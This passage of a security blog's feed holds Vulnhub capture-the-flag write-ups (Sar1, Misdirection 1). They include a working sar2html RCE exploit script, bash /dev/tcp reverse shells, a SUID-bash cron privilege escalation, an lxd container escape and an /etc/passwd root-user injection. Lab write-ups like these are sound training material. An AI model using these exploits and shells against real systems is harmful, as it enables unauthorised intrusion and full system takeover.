| http-enum:
|   /robots.txt: Robots file
|_  /phpinfo.php: Possible information file
|_http-server-header: Apache/2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_http-title: Apache2 Ubuntu Default Page: It works
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From this we discover sar2HTML.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-01.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Visiting this directory I get the version of sar2html as 3.2.1.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-02.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Checking on searchsploit, a remote command execution vulnerability exists for this version.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;searchsploit sar2html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-03.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;shell-as-user&#34;&gt;Shell as user&lt;/h1&gt;
&lt;p&gt;By executing the python script that exploits this RCE vulnerability, we are able to get a reverse shell.&lt;/p&gt;
&lt;p&gt;script url: &lt;a href=&#34;https://www.exploit-db.com/exploits/49344&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.exploit-db.com/exploits/49344&lt;/a&gt;

&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;~/Vulnhub/Sar1 î° python3 49344.py

Enter The url =&amp;gt; http://192.168.56.107/sar2HTML/
Command =&amp;gt; id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Command =&amp;gt; /bin/bash+-c+&#39;/bin/bash+-i+&amp;gt;%26+/dev/tcp/192.168.56.1/9000+0&amp;gt;%261&#39;
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-04.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Performing some enumeration to achieve some privilege escalation to root or lateral movement to other users
I found a cron job running as root.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-05.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;While we can&amp;rsquo;t write to this file, the script being executed inside it is writeable.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-06.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;shell-as-root&#34;&gt;Shell as root&lt;/h1&gt;
&lt;p&gt;By writing into write.sh using vi, we can escalate our privileges.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/sh

cp /bin/bash /var/www/html/suidbash
chmod u+s /var/www/html/suidbash
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This will create a copy of the bash binary and add suid permissions to it.&lt;/p&gt;
&lt;p&gt;Once the cron job executes and creates the binary we can achieve a root shell and read all the flags.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-07.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;extras&#34;&gt;Extras&lt;/h1&gt;
&lt;p&gt;Understanding the exploit script and perform the exploit manually.&lt;/p&gt;
&lt;p&gt;To my surprise, this exploit code was created by a good friend of mine, Musyoka Ian.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Exploit Title: sar2html 3.2.1 - &amp;#39;plot&amp;#39; Remote Code Execution&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Date: 27-12-2020&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Exploit Author: Musyoka Ian&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Vendor Homepage:https://github.com/cemtan/sar2html&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Software Link: https://sourceforge.net/projects/sar2html/&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Version: 3.2.1&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Tested on: Ubuntu 18.04.1&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; re
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; cmd &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Cmd

url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter The url =&amp;gt; &amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Terminal&lt;/span&gt;(Cmd):
    prompt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Command =&amp;gt; &amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;default&lt;/span&gt;(self, args):
        exploiter(args)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exploiter&lt;/span&gt;(cmd):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; url
    sess &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;session()
    output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{url}/index.php?plot=;{cmd}&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
        out &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; re&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;findall(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;option value=(.*?)&amp;gt;&amp;#34;&lt;/span&gt;, output&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Error!!&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ouut &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; out:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;There is no defined host...&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; ouut:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;null selected&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; ouut:
                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;selected&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; ouut:
                    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; (ouut)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; ()

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;):
    terminal &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Terminal()
    terminal&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cmdloop()&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;According to the script the vulnerable parameter is plot and simply takes in our command and executes it.&lt;/p&gt;
&lt;p&gt;When interacting with the application you can select OS, when you pick one the plot parameter is used.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-08.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Here we can inject the command we want and execute shell commands. The OS option doesn&amp;rsquo;t matter, anything after
the semi-colon &lt;code&gt;;&lt;/code&gt; will be executed. For the reverse shell command remember to url encode special chars like I did
above&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-09.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Shoutout to Musyoka Ian, you can read his blog linked below. He does cool writeups on challenges as well.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://musyokaian.medium.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://musyokaian.medium.com/&lt;/a&gt;

&lt;/p&gt;</content>
    </item>
    
    <item>
      <title>Vulnub: Misdirection 1</title>
      <link>https://blog.ikuamike.io/posts/2021/misdirection1/</link>
      <pubDate>Wed, 21 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/misdirection1/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Difficulty&lt;/th&gt;
&lt;th&gt;Release Date&lt;/th&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Beginner&lt;/td&gt;
&lt;td&gt;24 Sep 2019&lt;/td&gt;
&lt;td&gt;FalconSpy&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
&lt;p&gt;For this box, initial access was a web shell discovered. Then with low priv shell we could run bash as brexit user
and were able to pivot to that account. Once we are brexit user, we abuse his membership to the lxd to start a
privileged container that can read and write the whole file system by mounting it in the container.&lt;/p&gt;
&lt;h2 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h2&gt;
&lt;p&gt;Nmap&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.191.136
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.00032s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65531&lt;/span&gt; closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
80/tcp   open  http    Rocket httpd 1.2.6 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Python 2.7.15rc1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
3306/tcp open  mysql   MySQL &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;unauthorized&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
8080/tcp open  http    Apache httpd 2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
&lt;h3 id=&#34;8080-http&#34;&gt;8080 (HTTP)&lt;/h3&gt;
&lt;p&gt;Nmap&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap 7.91 scan initiated Wed Apr 14 06:31:44 2021 as: nmap -n -Pn -sV -p 8080 --script default,http-enum,http-shellshock,http-backup-finder,http-config-backup --append-output -oN recon-misdirection1/misdirection1-8080-httpnmap.enum 192.168.191.136&lt;/span&gt;
Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.191.136
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.00026s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
| http-enum:
|   /wordpress/: Blog
|   /wordpress/wp-login.php: Wordpress login page.
|   /css/: Potentially interesting directory w/ listing on &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span&gt;
|   /debug/: Potentially interesting folder
|   /development/: Potentially interesting directory w/ listing on &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span&gt;
|   /help/: Potentially interesting directory w/ listing on &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span&gt;
|   /images/: Potentially interesting directory w/ listing on &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span&gt;
|   /js/: Potentially interesting directory w/ listing on &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span&gt;
|   /manual/: Potentially interesting directory w/ listing on &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span&gt;
|_  /scripts/: Potentially interesting directory w/ listing on &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span&gt;
|_http-server-header: Apache/2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_http-title: Apache2 Ubuntu Default Page: It works
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ffuf&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ffuf -ic -c -u http://192.168.191.136:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;js                      &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 322, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
help                    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 324, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
wordpress               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 329, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
manual                  &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 326, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
debug                   &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 325, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
development             &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 331, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
shell                   &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 325, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
images                  &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 326, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
css                     &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 323, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
scripts                 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 301, Size: 327, Words: 20, Lines: 10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
server-status           &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 403, Size: 305, Words: 22, Lines: 12&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
                        &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 200, Size: 10918, Words: 3499, Lines: 376&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After some directory bruteforcing on both port 80 and 8080 I discovered several directories. On port 8080 the debug directory
contains a web shell.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;shell-as-www-data&#34;&gt;Shell as www-data&lt;/h2&gt;
&lt;p&gt;Supplying the following command we are able to get a reverse shell.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;bash -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.191.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;shell:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After some basic enumeration we discover www-data has sudo permissions to run /bin/bash as brexit user without
any password requirement.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-3.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;shell-as-brexit&#34;&gt;Shell as brexit&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sudo -u brexit /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-4.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;On running id we see that brexit is in the lxd group and no images are present.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-10.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;shell-as-root&#34;&gt;Shell as root&lt;/h2&gt;
&lt;p&gt;Brexit being in the lxd group allows for privilege escalation. First we need to add am image then create a container.&lt;/p&gt;
&lt;p&gt;First we need to get distrobuilder, the compile it. This uses go to compile therefore you need go to be installed.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;wget https://github.com/lxc/distrobuilder/archive/refs/tags/distrobuilder-1.2.zip
7z x distrobuilder-1.2.zip
cd distrobuilder-distrobuilder-1.2 
make
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can use go get as the repo instructions recommend but for me it didn&amp;rsquo;t work as expected.&lt;/p&gt;
&lt;p&gt;With distrobuilder ready, download the alpine image yaml file to build a small alpine image for lxd&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then run distrobuilder with the alpine yaml file as below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sudo ~/bin/distrobuilder build-lxd alpine.yaml -o image.release&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;3.8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This will result in two files: lxd.tar.xz and rootfs.squashfs.&lt;/p&gt;
&lt;p&gt;We then need to transfer this two files to our victim for privesc.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# on kali&lt;/span&gt;

python3 -m http.server

&lt;span style=&#34;color:#75715e&#34;&gt;# on victim&lt;/span&gt;

wget 192.168.191.1:8000/lxd.tar.xz
wget 192.168.191.1:8000/rootfs.squashfs
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-5.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After adding the image we need to run lxd init and can keep everything default.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;lxd init
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-7.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Then create the container to be privileged and mount the host os file system inside it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;lxc init alpine privesc -c security.privileged&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;true
lxc config device add privesc host-root disk source&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/ path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/mnt/root recursive&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;true
lxc start privesc
lxc exec privesc /bin/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With this we can read the host file system from inside the container and can read root.txt.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-8.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;To get shell as root I added a public key to authorized_keys of the root user and can ssh in as root.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-9.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;extras&#34;&gt;Extras&lt;/h2&gt;
&lt;p&gt;After looking at other writeups, there was another easy privesc that I didn&amp;rsquo;t explore.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Writeable /etc/passwd file&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The passwd file is writeable by the users in the brexit group.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-11.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We can add user with id 0 that will give us root privileges.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;openssl passwd -1 -salt user password123

echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user:$1$user$nY3qj2koDQU1.5HG4ZTj9/:0:0:User:/root:/bin/bash&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt;/etc/passwd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/misdirection1/misdirection-12.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;https://rioasmara.com/2021/01/29/privilege-escalation-with-lxd/

https://www.hackingarticles.in/lxd-privilege-escalation/

https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-etc-passwd
&lt;/code&gt;&lt;/pre&gt;</content>
    </item>
    
    <item>
      <title>Vulnhub: Lemon Squeezy 1</title>
      <link>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</link>
      <pubDate>Tue, 13 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Difficulty&lt;/th&gt;
&lt;th&gt;Release Date&lt;/th&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Beginner&lt;/td&gt;
&lt;td&gt;26 Apr 2020&lt;/td&gt;
&lt;td&gt;James Hay&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
